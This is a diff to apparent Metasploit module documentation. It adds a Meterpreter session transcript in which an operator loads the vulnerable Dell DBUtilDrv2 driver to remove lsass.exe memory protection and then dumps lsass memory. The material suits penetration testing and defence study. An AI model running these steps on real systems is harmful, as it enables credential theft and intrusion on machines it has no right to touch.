@@ -56,7 +56,7 @@ Enable or disable memory protection on the targetted process. `false` will remov
 
 ### PID
 
-The ID of the targetted process.
+The ID of the targetted process. If set to 0 (the default value), the module will automatically find lsass.exe.
 
 ## Verification Steps
 
@@ -277,6 +277,86 @@ msf6 post(windows/gather/memory_dump) > run
 [*] Dumping memory for lsass.exe
 [*] Downloading minidump (5.93 MiB)
 [+] Memory dump stored at /home/albinolobster/.msf4/loot/20211208072121_default_172.16.144.6_windows.process._495675.bin
+[*] Deleting minidump from disk
+[*] Post module execution completed
+msf6 post(windows/gather/memory_dump) > 
+```
+
+### Windows Server 2016 (10.0.14393) x64 using DBUtilDrv2 version 2.5 and PID option set to 0
+
+```
+[*] Started reverse TCP handler on 10.0.0.3:4444 
+[*] Meterpreter session 1 opened (10.0.0.3:4444 -> 10.0.0.8:45172 ) at 2021-12-18 04:12:03 -0800
+
+meterpreter > sysinfo
+Computer        : WIN-7ESIGFVFQEG
+OS              : Windows 2016+ (10.0 Build 14393).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+meterpreter > getuid
+Server username: WIN-7ESIGFVFQEG\albinolobster
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > ps | grep lsass
+Filtering on 'lsass'
+
+Process List
+============
+
+ PID  PPID  Name       Arch  Session  User  Path
+ ---  ----  ----       ----  -------  ----  ----
+ 664  504   lsass.exe  x64   0
+
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) > use post/windows/gather/memory_dump
+msf6 post(windows/gather/memory_dump) > set SESSIOn 1
+SESSIOn => 1
+msf6 post(windows/gather/memory_dump) > set PID 664
+PID => 664
+msf6 post(windows/gather/memory_dump) > set DUMP_PATH C:\\Windows\\Temp\\lsass_dump
+DUMP_PATH => C:\Windows\Temp\lsass_dump
+msf6 post(windows/gather/memory_dump) > run
+
+[*] Running module against WIN-7ESIGFVFQEG
+[*] Dumping memory for lsass.exe
+[-] Post aborted due to failure: payload-failed: Unable to open process: Access is denied.
+[*] Post module execution completed
+msf6 post(windows/gather/memory_dump) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > upload /home/albinolobster/drivers/2_5/ C:\\Windows\\Temp\\
+[*] uploading  : /home/albinolobster/drivers/2_5/DBUtilDrv2.cat -> C:\Windows\Temp\\DBUtilDrv2.cat
+[*] uploaded   : /home/albinolobster/drivers/2_5/DBUtilDrv2.cat -> C:\Windows\Temp\\DBUtilDrv2.cat
+[*] uploading  : /home/albinolobster/drivers/2_5/dbutildrv2.inf -> C:\Windows\Temp\\dbutildrv2.inf
+[*] uploaded   : /home/albinolobster/drivers/2_5/dbutildrv2.inf -> C:\Windows\Temp\\dbutildrv2.inf
+[*] uploading  : /home/albinolobster/drivers/2_5/DBUtilDrv2.sys -> C:\Windows\Temp\\DBUtilDrv2.sys
+[*] uploaded   : /home/albinolobster/drivers/2_5/DBUtilDrv2.sys -> C:\Windows\Temp\\DBUtilDrv2.sys
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 post(windows/gather/memory_dump) > use post/windows/manage/dell_memory_protect
+msf6 post(windows/manage/dell_memory_protect) > set DRIVER_PATH C:\\Windows\\Temp\\
+DRIVER_PATH => C:\Windows\Temp\
+msf6 post(windows/manage/dell_memory_protect) > set SESSION 1
+SESSION => 1
+msf6 post(windows/manage/dell_memory_protect) > run
+
+[*] Set PID option 664 for lsass.exe
+[*] Launching netsh to host the DLL...
+[+] Process 3008 launched.
+[*] Reflectively injecting the DLL into 3008...
+[+] Exploit finished
+[*] Post module execution completed
+msf6 post(windows/manage/dell_memory_protect) > use post/windows/gather/memory_dump
+msf6 post(windows/gather/memory_dump) > run
+
+[*] Running module against WIN-7ESIGFVFQEG
+[*] Dumping memory for lsass.exe
+[*] Downloading minidump (4.70 MiB)
+[+] Memory dump stored at /home/albinolobster/.msf4/loot/20211218041511_default_172.16.144.14_windows.process._536152.bin
 [*] Deleting minidump from disk
 [*] Post module execution completed
 msf6 post(windows/gather/memory_dump) > 
